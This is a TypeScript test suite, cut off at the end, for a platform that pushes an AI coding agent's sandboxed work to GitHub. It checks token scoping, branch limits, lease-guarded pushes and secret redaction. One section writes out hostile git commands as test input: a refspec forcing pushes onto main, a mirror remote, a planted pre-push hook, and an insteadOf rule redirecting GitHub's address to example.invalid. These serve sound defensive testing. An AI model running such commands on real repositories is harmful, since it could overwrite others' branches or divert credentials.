	const taken = new Set(["windlass/add-csv-export", "windlass/add-csv-export-2"]);
	const free = await naming.freeBranch("Add CSV export", async name => taken.has(name));
	expect(
		"a standalone agent's branch is its title in whole words, numbered past the branches the host has",
		naming.branchWords("Run the whole test suite and fix the flaky ones") === "run-the-whole-test-suite-and-fix-the" &&
			naming.branchWords("Supercalifragilisticexpialidocious-and-then-some-more-words") ===
				"supercalifragilisticexpialidocious-and" &&
			naming.branchWords("x".repeat(50)) === "x".repeat(40) &&
			naming.wantedBranch(" … ") === "windlass/agent" &&
			free === "windlass/add-csv-export-3",
		free,
	);
	const sandbox = localSandbox("publish");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	expect(
		"with no changes, git says there is nothing GitHub lacks",
		(await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, null)) === false,
	);
	writeFileSync(join(sandbox.cwd, "src/add.ts"), "export const add = (a: number, b: number) => a + b\n");
	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- add() adds\n");
	expect(
		"with changed files, it says there is",
		(await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, null)) === true,
	);

	const from = standin.minted.length;
	const input = {
		evidence: NOTHING_VERIFIED,
		app,
		connection: adaConnection,
		repository,
		sandbox,
		sessionId: "s_0123456789abcdef",
		branch: BRANCH,
	};
	const first = await publish.publishWork({
		...input,
		pull: null,
		pushed: null,
		message: { title: "Fix the failing add test", body: "add() subtracted. It adds now." },
	});
	const tokens = tokensSince(from);
	expect(
		"the pull request is opened",
		first.opened &&
			first.pull.number === 1 &&
			first.pull.state === "open" &&
			first.pull.branch === BRANCH &&
			first.pull.base === "main" &&
			first.pull.url === `${standin.url}/ada/harbor/pull/1`,
		JSON.stringify(first.pull),
	);
	const made = standin.pulls.at(-1);
	expect(
		"at GitHub it has the title and the description the user gave",
		made?.title === "Fix the failing add test" &&
			own(made.body) === "add() subtracted. It adds now." &&
			made.body.endsWith("<!-- /windlass-platform:verified -->") &&
			made.head === BRANCH &&
			made.base === "main",
	);
	const commit = standin.lastCommit(harbor, BRANCH);
	expect(
		"the branch at GitHub has the commit, with that message, in the GitHub user's name",
		commit.message === "Fix the failing add test\n\nadd() subtracted. It adds now." &&
			commit.author === `ada <${ada.id}+ada@users.noreply.github.com>` &&
			commit.files.sort().join(",") === "CHANGES.md,src/add.ts" &&
			first.committedFiles === 2 &&
			first.head === standin.branchHead(harbor, BRANCH),
		`${commit.author}; ${commit.files.join(", ")}`,
	);
	expect(
		"the base branch is untouched",
		standin.fileOn(harbor, "main", "src/add.ts")?.includes("a - b") === true &&
			standin.fileOn(harbor, BRANCH, "src/add.ts")?.includes("a + b") === true,
	);
	expect(
		"three tokens: the user's permission (metadata), the push (contents: write), the pull request (pull requests: write, contents: read), each for this repository",
		mintedSince(from).join("; ") ===
			[
				`metadata:read @ all`,
				`metadata:read,contents:write @ ${harbor.id}`,
				`metadata:read,contents:read,pull_requests:write @ ${harbor.id}`,
			].join("; ") ||
			mintedSince(from).slice(-2).join("; ") ===
				[
					`metadata:read,contents:write @ ${harbor.id}`,
					`metadata:read,contents:read,pull_requests:write @ ${harbor.id}`,
				].join("; "),
		mintedSince(from).join("; "),
	);
	const pushToken = standin.minted.slice(from).find(entry => entry.permissions?.contents === "write")?.token ?? "";
	expect("the push's token was revoked when the push had ended", pushToken !== "" && !standin.alive(pushToken));
	expect(
		"no file in the workspace, the home directory or /tmp holds a token",
		tokens.every(
			token => filesHolding(sandbox.cwd, token).length === 0 && filesHolding(sandbox.home, token).length === 0,
		) && readdirSync("/tmp").every(name => !/^wlp-(push|publish|message)/.test(name)),
	);
	const github = githubCodeHost(app);
	const [pushedThere, freeThere] = await app.withToken(
		adaInstallation.id,
		{ repositoryId: harbor.id, permissions: { metadata: "read", contents: "read" } },
		token => Promise.all([BRANCH, `${BRANCH}-2`].map(branch => github.hasBranch(token, "ada", "harbor", branch))),
		{ revokeAfter: true },
	);
	expect(
		"GitHub is asked which branch names it has: the pushed branch, and not the next number after it",
		pushedThere && !freeThere,
	);
	const local = await sandbox.run("git symbolic-ref --short HEAD; git status --porcelain; git config --list --local");
	expect(
		"the workspace is on the session's branch, clean, and its configuration is as it was",
		local.stdout.startsWith(`${BRANCH}\n`) &&
			!tokens.some(token => local.stdout.includes(token)) &&
			!/helper|extraheader/i.test(local.stdout),
		local.stdout.split("\n").slice(0, 2).join(" | "),
	);
	expect(
		"with everything pushed, git says there is nothing GitHub lacks",
		(await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, first.head)) === false,
	);

	const nothing = await problem(() =>
		publish.publishWork({ ...input, pull: first.pull, pushed: first.head, message: { title: "Again", body: "" } }),
	);
	expect(
		"pushing again with nothing new is said so, and makes no commit",
		nothing?.message === `There is nothing to push: ${BRANCH} at GitHub already has everything in the workspace.` &&
			standin.branchHead(harbor, BRANCH) === first.head,
		nothing?.message,
	);

	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- add() adds\n- and says so\n");
	const second = await publish.publishWork({
		...input,
		pull: first.pull,
		pushed: first.head,
		message: { title: "Say what changed", body: "" },
	});
	expect(
		"a second push goes to the same branch and the same pull request",
		!second.opened &&
			second.pull.number === 1 &&
			second.committedFiles === 1 &&
			standin.pulls.length === 1 &&
			standin.lastCommit(harbor, BRANCH).message === "Say what changed" &&
			second.head !== first.head,
	);

	// The agent commits its own work: nothing is uncommitted, and the commit still has to go.
	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- add() adds\n- and says so\n- twice\n");
	await sandbox.run("git commit --quiet -am 'The agent commits by itself'");
	expect(
		"a commit of the agent's own is something GitHub lacks",
		(await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, second.head)) === true,
	);
	const third = await publish.publishWork({
		...input,
		pull: second.pull,
		pushed: second.head,
		message: { title: "unused", body: "" },
	});
	expect(
		"it is pushed as it is, with no commit of the platform's on top",
		third.committedFiles === 0 &&
			standin.lastCommit(harbor, BRANCH).message === "The agent commits by itself" &&
			!third.opened,
	);

	// Claude Code and OpenCode commit with trailers of their own, and may try to push: the platform's push takes the commit as it is.
	const trailers = "Fix the sign\n\nGenerated with Claude Code\n\nCo-Authored-By: Claude <noreply@anthropic.invalid>";
	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- add() adds\n- and says so\n- twice\n- with trailers\n");
	await sandbox.run(`git commit --quiet -a -F - <<'MSG'\n${trailers}\nMSG`);
	const ownPush = await sandbox.run(`GIT_TERMINAL_PROMPT=0 git push origin HEAD:${BRANCH} 2>&1; echo exit=$?`);
	expect(
		"an agent's own git push fails: the sandbox holds no GitHub credential",
		/exit=(?!0)/.test(ownPush.stdout) && standin.branchHead(harbor, BRANCH) === third.head,
		ownPush.stdout.trim().split("\n").slice(-1).join(""),
	);
	writeFileSync(join(sandbox.cwd, "src/sub.ts"), "export const sub = (a: number, b: number) => a - b\n");
	const trailed = await publish.publishWork({
		...input,
		pull: third.pull,
		pushed: third.head,
		message: { title: "Add sub()", body: "" },
	});
	const pushedLog = await sandbox.run(`git log --format=%B -n 2 ${trailed.head}`);
	expect(
		"the agent's commit with its trailers goes as it is, and what it left uncommitted in the platform's commit on top",
		trailed.committedFiles === 1 &&
			standin.lastCommit(harbor, BRANCH).message === "Add sub()" &&
			pushedLog.stdout.includes("Co-Authored-By: Claude") &&
			pushedLog.stdout.includes("Generated with Claude Code") &&
			standin.branchHead(harbor, BRANCH) === trailed.head,
		pushedLog.stdout.replace(/\n+/g, " | "),
	);
	const thirdHead = trailed;

	// Merged at GitHub: the next push opens a new pull request from the same branch.
	(standin.pulls[0] as (typeof standin.pulls)[number]).state = "closed";
	(standin.pulls[0] as (typeof standin.pulls)[number]).merged = true;
	const seen = await publish.refreshPull(app, adaConnection, repository, thirdHead.pull);
	expect("a pull request that was merged at GitHub is seen as merged", seen.state === "merged" && seen.number === 1);
	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- more\n");
	const fourth = await publish.publishWork({
		...input,
		pull: seen,
		pushed: thirdHead.head,
		message: { title: "More after the merge", body: "Follow-up." },
	});
	expect(
		"after a merge, the next push opens a new pull request",
		fourth.opened && fourth.pull.number === 2 && fourth.pull.state === "open" && standin.pulls.length === 2,
	);

	// The pull request exists but the session lost track of it: GitHub's is taken up, not doubled.
	writeFileSync(join(sandbox.cwd, "CHANGES.md"), "- more\n- still more\n");
	const adopted = await publish.publishWork({
		...input,
		pull: null,
		pushed: fourth.head,
		message: { title: "Lost and found", body: "" },
	});
	expect(
		"a pull request that is open already is taken up, not opened twice",
		!adopted.opened && adopted.pull.number === 2 && standin.pulls.length === 2,
	);
});

// ---------------------------------------------------------------------------------------------
// The agent asks the platform to publish (server/src/agent-publish.ts)
// ---------------------------------------------------------------------------------------------

await section("the agent asks: what a request may hold, and what becomes of an open pull request", async () => {
	const asks = await import("../server/src/agent-publish.js");
	const { SecretRedactor, NO_REDACTION } = await import("../server/src/repo-secrets.js");
	const where = { branch: "windlass/agent-asks-00aabb", base: "main" };

	// The tools as they are declared to Windlass when a session is opened (its docs/acp.md, "Tools the client runs").
	const person = asks.platformTools({ publish: true, report: false, push: true }, 10 * 60_000);
	const item = asks.platformTools({ publish: false, report: true, push: true }, 10 * 60_000);
	const byName = (list: typeof person) => new Map(list.map(tool => [tool.name, tool]));
	expect(
		"a person's session is offered publish, push and fetch_base; an item's report, push and fetch_base, and never publish",
		person.map(tool => tool.name).join() === "publish,push,fetch_base" &&
			item.map(tool => tool.name).join() === "report,push,fetch_base",
		`${person.map(tool => tool.name)} / ${item.map(tool => tool.name)}`,
	);
	expect(
		"each is declared read, which Windlass never asks about, and each answer is the platform's own",
		[...person, ...item].every(
			tool => tool.effect === "read" && tool.untrustedResult === false && tool.inputSchema.type === "object",
		),
	);
	expect(
		"a publish may wait for the person's answer and the push (10 + 5 minutes), a push or a fetch 5 minutes, and a report 3 minutes, to upload its screenshots",
		byName(person).get("publish")?.timeoutSeconds === 900 &&
			byName(person).get("push")?.timeoutSeconds === 300 &&
			byName(person).get("fetch_base")?.timeoutSeconds === 300 &&
			byName(item).get("report")?.timeoutSeconds === 180 &&
			asks.platformTools({ publish: true, report: false, push: false }, 24 * 3_600_000)[0]?.timeoutSeconds === 3600,
	);

	// Windlass's configuration file in the sandbox: a server an older platform left there under its name goes, whether or not the platform's list names it (server/src/windlass-config.ts).
	const { PLATFORM_WAKE, TURN_TIME_HOOK, platformConfig } = await import("../server/src/windlass-config.js");
	const held = { approval: { untrustedPaths: ["**"] }, mcp: { servers: { tracker: { command: "tracker-mcp" } } } };
	const left = JSON.stringify({
		...held,
		mcp: { servers: { ...held.mcp.servers, [asks.PUBLISH_SERVER]: { command: "python3" } } },
	});
	expect(
		"the server an older platform left under its own name goes from Windlass's configuration",
		JSON.stringify(JSON.parse(platformConfig(left, null, [])?.config as string)) ===
			JSON.stringify({ ...held, hooks: { beforeTool: [TURN_TIME_HOOK] }, wake: PLATFORM_WAKE }),
	);

	// What a request may hold.
	const fine = asks.publishRequest(
		{
			title: "  Fix   the\tlight ",
			description: "It was off.\r\n\r\nNow it is on.\u001b[31m",
			commit_message: undefined,
		},
		where,
		NO_REDACTION,
	);
	expect(
		"a request's text is tidied, and the commit's message is the title when none is given",
		fine.ok &&
			fine.message.title === "Fix the light" &&
			fine.message.body === "It was off.\n\nNow it is on.[31m" &&
			fine.message.commit === "Fix the light",
		JSON.stringify(fine),
	);
	const secret = 'line one\nline "two" of the key';
	const redactor = new SecretRedactor([{ name: "DEPLOY_KEY", value: secret }]);
	const leaked = asks.publishRequest(
		{ title: "Use the key", description: `The key is ${secret}.`, commit_message: `Add ${secret}` },
		where,
		redactor,
	);
	expect(
		"a saved secret is taken out of the title, the description and the commit's message, also one with line breaks and quotes",
		leaked.ok &&
			!JSON.stringify(leaked).includes("line one") &&
			leaked.message.body === "The key is [secret:DEPLOY_KEY]." &&
			leaked.message.commit === "Add [secret:DEPLOY_KEY]",
		JSON.stringify(leaked),
	);
	const refusals = [
		asks.publishRequest({ title: "x", branch: "main" }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", branch: "feature/other" }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", head: "main" }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", base: "release" }, where, NO_REDACTION),
		asks.publishRequest({ title: "x".repeat(121) }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", description: "y".repeat(4001) }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", commit_message: "z".repeat(4001) }, where, NO_REDACTION),
		asks.publishRequest({ title: "   " }, where, NO_REDACTION),
		asks.publishRequest({}, where, NO_REDACTION),
		asks.publishRequest({ title: ["x"] }, where, NO_REDACTION),
		asks.publishRequest({ title: "x", description: { text: "y" } }, where, NO_REDACTION),
	];
	expect(
		"another branch, the default branch, another base, text past its limit, no title and what is not text are refused, each with a sentence for the agent",
		refusals.every(
			refusal =>
				!refusal.ok && refusal.told.startsWith("Not published. ") && refusal.said.endsWith("so nothing was published."),
		),
		refusals.map(refusal => (refusal.ok ? "accepted" : refusal.told.slice(15, 60))).join(" | "),
	);
	expect(
		"the session's own branch and base, named, are accepted",
		asks.publishRequest({ title: "x", branch: where.branch, base: "main" }, where, NO_REDACTION).ok,
	);
	const message = { title: "T", body: "", commit: "T" };
	expect(
		"where commands are not held in Windlass's sandbox the question cannot be answered for the session, and says why",
		asks
			.publishQuestionWords({
				repository: "ada/harbor",
				branch: where.branch,
				base: "main",
				message,
				open: null,
				sandbox: "windlass",
			})
			.choices.map(choice => choice.id)
			.join() === "once,session,deny" &&
			asks
				.publishQuestionWords({
					repository: "ada/harbor",
					branch: where.branch,
					base: "main",
					message,
					open: null,
					sandbox: "none",
				})
				.choices.map(choice => choice.id)
				.join() === "once,deny" &&
			asks
				.publishQuestionWords({
					repository: "ada/harbor",
					branch: where.branch,
					base: "main",
					message,
					open: null,
					sandbox: "unknown",
				})
				.details.some(detail => detail.includes("could have asked this in the agent's name")) &&
			asks.publishUnaskedProblem("windlass") === null &&
			asks.publishUnaskedProblem("none") !== null &&
			asks.publishUnaskedProblem("unknown") !== null,
	);

	// The same `publishWork`, with the agent's commit message and with an open pull request given its title and description.
	const sandbox = localSandbox("asks");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const pullsBefore = standin.pulls.length;
	writeFileSync(join(sandbox.cwd, "ASKED.md"), "- one\n");
	const base = {
		evidence: NOTHING_VERIFIED,
		app,
		connection: adaConnection,
		repository,
		sandbox,
		sessionId: "s_agentasks0000aabb",
		branch: where.branch,
		retitle: true,
	};
	const first = await publish.publishWork({
		...base,
		pull: null,
		pushed: null,
		message: { title: "Ask to publish", body: "First description.", commit: "The commit's own message" },
	});
	expect(
		"the pull request is opened with the agent's title and description, and the commit has the commit's message",
		first.opened &&
			first.pushed &&
			!first.retitled &&
			standin.pulls.length === pullsBefore + 1 &&
			standin.pulls.at(-1)?.title === "Ask to publish" &&
			own(standin.pulls.at(-1)?.body) === "First description." &&
			standin.lastCommit(harbor, where.branch).message === "The commit's own message",
	);
	writeFileSync(join(sandbox.cwd, "ASKED.md"), "- one\n- two\n");
	const second = await publish.publishWork({
		...base,
		pull: first.pull,
		pushed: first.head,
		message: { title: "Ask to publish, again", body: "Second description.", commit: "Two" },
	});
	expect(
		"a second request pushes to the same pull request and gives it the new title and description",
		!second.opened &&
			second.pushed &&
			second.retitled &&
			second.pull.number === first.pull.number &&
			second.pull.title === "Ask to publish, again" &&
			standin.pulls.length === pullsBefore + 1 &&
			own(standin.pulls.at(-1)?.body) === "Second description.",
	);
	const same = await problem(() =>
		publish.publishWork({
			...base,
			pull: second.pull,
			pushed: second.head,
			message: { title: "Ask to publish, again", body: "Second description.", commit: "x" },
		}),
	);
	expect(
		"with nothing new to push and nothing new to say, it is refused as from the panel",
		same?.message === `There is nothing to push: ${where.branch} at GitHub already has everything in the workspace.`,
		same?.message,
	);
	const words = await publish.publishWork({
		...base,
		pull: second.pull,
		pushed: second.head,
		message: { title: "Ask to publish, again", body: "Third description.", commit: "x" },
	});
	expect(
		"with nothing new to push, a new description alone is given to the pull request, and nothing is pushed",
		!words.opened &&
			!words.pushed &&
			words.retitled &&
			own(standin.pulls.at(-1)?.body) === "Third description." &&
			standin.branchHead(harbor, where.branch) === second.head &&
			words.pull.pushedAt === second.pull.pushedAt,
	);
	const panel = await problem(() =>
		publish.publishWork({
			...base,
			retitle: false,
			pull: words.pull,
			pushed: second.head,
			message: { title: "Other words", body: "From the panel." },
		}),
	);
	expect(
		"a push from the panel leaves an open pull request's title and description as they are",
		panel?.message.startsWith("There is nothing to push") === true &&
			standin.pulls.at(-1)?.title === "Ask to publish, again",
	);
});

// ---------------------------------------------------------------------------------------------
// The agent pushes its own branch (agent-publish.ts `push`, publish.ts `pushWork`)
// ---------------------------------------------------------------------------------------------

await section(
	"the agent pushes: the session's branch only, no pull request, and over nothing but the platform's own last push",
	async () => {
		const asks = await import("../server/src/agent-publish.js");
		const { SecretRedactor, NO_REDACTION } = await import("../server/src/repo-secrets.js");
		const branch = "windlass/agent-pushes-00ccdd";
		const where = { branch, title: "Agent pushes" };

		// What a push may hold.
		const refused = [
			asks.pushRequest({ branch: "main" }, where, NO_REDACTION),
			asks.pushRequest({ branch: "feature/x" }, where, NO_REDACTION),
			asks.pushRequest({ message: ["x"] }, where, NO_REDACTION),
			asks.pushRequest({ message: "m".repeat(4001) }, where, NO_REDACTION),
		];
		expect(
			"a push that names another branch (the default one too), a message that is not text, or one past its limit is refused, with a sentence for the agent",
			refused.every(
				push => !push.ok && push.told.startsWith("Not pushed. ") && push.said.endsWith("so nothing was pushed."),
			),
			refused.map(push => (push.ok ? "accepted" : push.told.slice(12, 60))).join(" | "),
		);
		const named = asks.pushRequest({ branch }, where, NO_REDACTION);
		const secret = asks.pushRequest(
			{ message: "Use s3cr3t-push-value-0123\u001b now" },
			where,
			new SecretRedactor([{ name: "KEY", value: "s3cr3t-push-value-0123" }]),
		);
		expect(
			"the session's own branch is accepted, a push without a message is named for the session, and a message is cleaned",
			named.ok && named.commit === "Agent pushes" && secret.ok && secret.commit === "Use [secret:KEY] now",
			JSON.stringify([named, secret]),
		);

		const sandbox = localSandbox("pushes");
		const repository = stored(harbor, adaInstallation);
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		const mainBefore = standin.branchHead(harbor, "main");
		const pullsBefore = standin.pulls.length;
		const base = { app, connection: adaConnection, repository, sandbox, sessionId: "s_agentpushes00ccdd", branch };
		// What the session keeps, as agent-session.ts does after each push: what GitHub has, and what the platform itself pushed last (the lease).
		let pushedHead: string | null = null;
		let platformPushed: string | null = null;
		const agentPush = async (message: string) => {
			const done = await publish.pushWork({ ...base, pushed: pushedHead, lease: platformPushed }, message);
			if (done.pushed && done.head) pushedHead = platformPushed = done.head;
			return done;
		};

		writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n");
		const first = await agentPush("First push");
		expect(
			"the first push pushes the session's branch with the agent's message, names the commit it pushed, and opens no pull request",
			first.pushed &&
				!first.forced &&
				first.committedFiles === 1 &&
				first.head !== null &&
				first.head === standin.branchHead(harbor, branch) &&
				standin.lastCommit(harbor, branch).message === "First push" &&
				standin.pulls.length === pullsBefore,
			JSON.stringify(first),
		);
		const again = await agentPush("Again");
		expect(
			"with nothing new it pushes nothing, and says so",
			!again.pushed && standin.branchHead(harbor, branch) === first.head,
		);

		// A pull request is open (the person published): a push rewrites its section, as at every push, and keeps the title and description.
		const opened = await publish.publishWork({
			...base,
			evidence: NOTHING_VERIFIED,
			pull: null,
			pushed: pushedHead,
			message: { title: "The person's title", body: "The person's words." },
		});
		writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n- two\n");
		const second = await agentPush("Second push");
		const described = await publish.describePull({
			app,
			connection: adaConnection,
			repository,
			sandbox,
			pull: opened.pull,
			evidence: { ...NOTHING_VERIFIED, during: 4 },
		});
		const atGithub = standin.pulls.find(pull => pull.number === opened.pull.number);
		expect(
			"with a pull request open, a push of the agent's goes to its branch, the commit it names is the branch's at GitHub, and the section says the turn is still running; the title and the description stay",
			second.pushed &&
				second.head === standin.branchHead(harbor, branch) &&
				pushedHead === second.head &&
				described !== null &&
				atGithub?.title === "The person's title" &&
				own(atGithub.body) === "The person's words." &&
				atGithub.body.includes("was still running") &&
				standin.pulls.length === pullsBefore + 1,
			atGithub?.body.slice(-300),
		);

		// The base moves on; the agent fetches it, rebases onto it, and pushes again: the platform's own last push is replaced.
		standin.commit(harbor, "main", { "BASE.md": "moved on\n" }, "The base moves on");
		const mainMoved = standin.branchHead(harbor, "main");
		await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
		const rebased = await sandbox.run("git rebase --quiet origin/main && git rev-parse HEAD");
		const third = await agentPush("unused");
		expect(
			"after fetch_base and a rebase, the push replaces the platform's last push, says it did, and leaves the base as it is",
			rebased.exitCode === 0 &&
				third.pushed &&
				third.forced &&
				third.committedFiles === 0 &&
				standin.branchHead(harbor, branch) === rebased.stdout.trim() &&
				platformPushed === third.head &&
				standin.branchHead(harbor, "main") === mainMoved &&
				mainMoved !== mainBefore &&
				standin.fileOn(harbor, branch, "BASE.md") === "moved on\n",
			`${rebased.stderr} ${JSON.stringify(third)}`,
		);

		// Someone else commits to the session's branch (a suggestion accepted on the pull request): a push that does not have it is refused, with its own sentence.
		const theirs = standin.commit(harbor, branch, { "THEIRS.md": "someone else's\n" }, "Someone else's commit");
		writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n- two\n- three\n");
		const stale = await problem(() => agentPush("Without theirs"));
		expect(
			"a push that lacks a commit someone else pushed is refused, the platform's lease does not cover it, and the sentence says to fetch and merge it",
			stale?.message.includes("has commits someone else pushed since the platform's last push") === true &&
				stale.message.includes(`origin/${branch}`) &&
				standin.branchHead(harbor, branch) === theirs,
			stale?.message,
		);
		// fetch_base brings the session's own branch too: the agent merges it, and the push is an ordinary fast-forward.
		await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
		const merged = await sandbox.run(`git merge --quiet --no-edit origin/${branch} && git rev-parse HEAD`);
		const fourth = await agentPush("unused");
		expect(
			"after fetch_base brought the branch and the agent merged it, the push goes as a fast-forward, keeping the other person's commit",
			merged.exitCode === 0 &&
				fourth.pushed &&
				!fourth.forced &&
				standin.branchHead(harbor, branch) === fourth.head &&
				standin.fileOn(harbor, branch, "THEIRS.md") === "someone else's\n",
			`${merged.stderr} ${JSON.stringify(fourth)}`,
		);

		// The panel's push never forces, over the platform's own last push either.
		await sandbox.run("git commit --quiet --amend -m 'Rewritten by the agent'");
		const panel = await problem(() => publish.pushWork({ ...base, pushed: pushedHead }, "unused"));
		expect(
			"a push without the lease (the panel's) refuses a branch the workspace has rewritten",
			panel?.message.includes("has commits this workspace does not have") === true &&
				standin.branchHead(harbor, branch) === fourth.head,
			panel?.message,
		);

		// A sandbox replaced after someone else pushed: the clone takes in their commit as what GitHub has, but the lease stays the platform's own push.
		const after = standin.commit(harbor, branch, { "AFTER.md": "pushed after the platform\n" }, "Someone else, again");
		const replaced = localSandbox("pushes-replaced");
		const cloned = await publish.cloneRepository(app, adaConnection, repository, replaced, undefined, branch);
		const headThere = cloned !== false ? await publish.putOnWork(replaced, cloned.directory, branch) : null;
		// What the session does then (agent-session.ts putWorkspaceOnWork): what GitHub has is the new tip; the lease is untouched.
		pushedHead = headThere;
		await replaced.run(
			"git reset --quiet --hard HEAD~1 && echo dropped > DROPPED.md && git add -A && git commit --quiet -m 'Drops their commit'",
		);
		const dropped = await problem(() =>
			publish.pushWork({ ...base, sandbox: replaced, pushed: pushedHead, lease: platformPushed }, "unused"),
		);
		expect(
			"in a replaced sandbox, a rewritten branch cannot push away a commit someone else pushed: the lease is the platform's own last push, not what the clone found",
			headThere === after &&
				platformPushed === fourth.head &&
				dropped?.message.includes("has commits someone else pushed") === true &&
				standin.branchHead(harbor, branch) === after,
			dropped?.message,
		);
		expect("the default branch was never touched by any of it", standin.branchHead(harbor, "main") === mainMoved);
	},
);

// Over MCP any process of the sandbox may call push (platform-tools.ts): what such a process can set up in the workspace
// before it calls, and what the push then does. The call itself names no ref, force or lease (harness-check, mcpPushCheck).
await section(
	"a process of the sandbox that steers the workspace and calls push reaches only the session's branch, under the platform's lease",
	async () => {
		const branch = "windlass/forged-push-00eeff";
		const sandbox = localSandbox("forged-push");
		const repository = stored(harbor, adaInstallation);
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		const mainBefore = standin.branchHead(harbor, "main");
		const base = { app, connection: adaConnection, repository, sandbox, sessionId: "s_forgedpush00eeff", branch };
		writeFileSync(join(sandbox.cwd, "FORGED.md"), "one\n");
		const first = await publish.pushWork({ ...base, pushed: null, lease: null }, "The platform's push");
		// The process: on a local branch called main, with a push refspec, a mirror remote, a rewrite of GitHub's address and a
		// pre-push hook in the workspace's Git configuration, it commits and asks for a push.
		const steered = await sandbox.run(
			[
				"git checkout --quiet -B main",
				"git config remote.origin.push '+refs/heads/*:refs/heads/main'",
				"git config remote.origin.mirror true",
				"git config push.default matching",
				"mkdir -p .git/hooks && printf '#!/bin/sh\\ntouch \"$PWD/.hook-ran\"\\n' > .git/hooks/pre-push && chmod +x .git/hooks/pre-push",
				"echo forged > FORGED.md && git add -A && git commit --quiet -m 'Forged on main' && git rev-parse HEAD",
			].join(" && "),
		);
		// A rewrite of GitHub's address is a setting the platform does not run at all: refused before any token, nothing pushed.
		await sandbox.run("git config url.https://example.invalid/.insteadOf https://");
		const rewritten = await problem(() =>
			publish.pushWork({ ...base, pushed: first.head, lease: first.head }, "unused"),
		);
		expect(
			"a workspace that rewrites GitHub's address is refused before any token, and nothing is pushed",
			rewritten?.message.includes("insteadof") === true &&
				rewritten.message.includes("Nothing was pushed") &&
				standin.branchHead(harbor, branch) === first.head,
			rewritten?.message,
		);
		await sandbox.run("git config --unset url.https://example.invalid/.insteadOf");
		const forged = await publish.pushWork({ ...base, pushed: first.head, lease: first.head }, "unused");
		expect(
			"it pushes the workspace's commit to the session's branch and nowhere else: main at GitHub stays, the workspace's remote, refspecs, mirror setting and hooks are not used",
			steered.exitCode === 0 &&
				forged.pushed &&
				standin.branchHead(harbor, branch) === steered.stdout.trim() &&
				standin.branchHead(harbor, "main") === mainBefore &&
				!existsSync(join(sandbox.cwd, ".hook-ran")),
			`${steered.stderr} ${JSON.stringify(forged)} main=${standin.branchHead(harbor, "main")}`,
		);
		// Someone else commits to the session's branch; the process rewinds the workspace to the platform's first push (an old
		// lease, as it were) and commits over it: the lease is the platform's own last push, so GitHub refuses it.
		const theirs = standin.commit(harbor, branch, { "THEIRS.md": "someone else's\n" }, "Someone else's commit");
		await sandbox.run(
			`git reset --quiet --hard ${first.head} && echo rewound > FORGED.md && git add -A && git commit --quiet -m 'Rewound'`,
		);
		const rewound = await problem(() =>
			publish.pushWork({ ...base, pushed: forged.head, lease: forged.head }, "unused"),
		);
		expect(
			"a rewound branch that would drop someone else's commit is refused under the platform's lease, and the branch keeps their commit",
			rewound?.message.includes("has commits someone else pushed since the platform's last push") === true &&
				standin.branchHead(harbor, branch) === theirs &&
				standin.branchHead(harbor, "main") === mainBefore,
			rewound?.message,
		);
	},
);

await section(
	"a push that would send a saved secret's value is refused, and the platform's own commit is undone",
	async () => {
		const { SecretRedactor } = await import("../server/src/repo-secrets.js");
		const redactor = new SecretRedactor([{ name: "NPM_TOKEN", value: "npm_s3cr3t_value_000111" }]);
		const sandbox = localSandbox("leak");
		const repository = stored(harbor, adaInstallation);
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		const branch = "windlass/leak-00aa11";
		const base = {
			app,
			connection: adaConnection,
			repository,
			sandbox,
			sessionId: "s_leak00000000aa11",
			branch,
			pushed: null,
			lease: null,
			redact: (text: string) => redactor.text(text),
		};
		// What a setup command may leave behind: a file with the token in it, beside the agent's work.
		writeFileSync(join(sandbox.cwd, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_s3cr3t_value_000111\n");
		writeFileSync(join(sandbox.cwd, "WORK.md"), "the agent's work\n");
		const headBefore = (await sandbox.run("git rev-parse HEAD")).stdout.trim();
		const refused = await problem(() => publish.pushWork(base, "Work with a leak"));
		const after = await sandbox.run("git rev-parse HEAD; git status --porcelain");
		expect(
			"the push is refused naming the file and the secret, nothing reaches GitHub, and the platform's commit is undone with the change kept",
			refused?.message.startsWith(
				"Nothing was pushed: .npmrc would have gone to GitHub with the value of the secret NPM_TOKEN",
			) === true &&
				standin.branchHead(harbor, branch) === null &&
				after.stdout.startsWith(`${headBefore}\n`) &&
				after.stdout.includes(".npmrc") &&
				after.stdout.includes("WORK.md"),
			`${refused?.message} | ${after.stdout.replace(/\n/g, " ")}`,
		);
		// A commit of the agent's own that added the value and a later one that removed it: the history would still send it.
		await sandbox.run(
			"git add -A && git commit --quiet -m 'Adds the leak' && git rm --quiet --cached .npmrc && rm .npmrc && git commit --quiet -m 'Removes it'",
		);
		const history = await problem(() => publish.pushWork(base, "unused"));
		expect(
			"a value added by one commit and removed by a later one is refused all the same: the commits sent hold it",
			history?.message.includes(".npmrc") === true && standin.branchHead(harbor, branch) === null,
			history?.message,
		);
		await sandbox.run("git reset --quiet --hard HEAD~2 && echo clean > CLEAN.md");
		const clean = await publish.pushWork(base, "Clean work");
		expect(
			"without the value, the push goes",
			clean.pushed && standin.branchHead(harbor, branch) === clean.head,
			JSON.stringify(clean),
		);
	},
);

await section("provider credentials are refused before any push token is issued", async () => {
	const repository = stored(harbor, adaInstallation);
	const sandbox = localSandbox("provider-credentials");
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const branch = "windlass/provider-credentials";
	const input = {
		app,
